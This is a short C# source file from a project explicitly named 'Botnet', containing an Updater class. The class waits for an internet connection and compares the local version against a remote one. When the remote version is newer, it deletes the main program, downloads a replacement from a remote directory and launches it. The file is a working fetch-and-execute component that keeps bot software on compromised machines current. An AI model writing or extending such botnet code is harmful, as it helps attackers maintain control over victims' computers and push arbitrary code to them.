using System.IO;

namespace Botnet
{
    class Updater
    {
        static void Main(string[] args)
        {
            Utility.WaitForInternet();
            if (Utility.GetProgramCurrentVersion() < Utility.GetProgramLatestVersion())
            {
                File.Delete(Utility.mainDir + Utility.mainProgramName);
                Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.mainProgramName, Utility.mainDir + Utility.mainProgramName);
            }
            System.Diagnostics.Process.Start(Utility.mainDir + Utility.mainProgramName);
        }
    }
}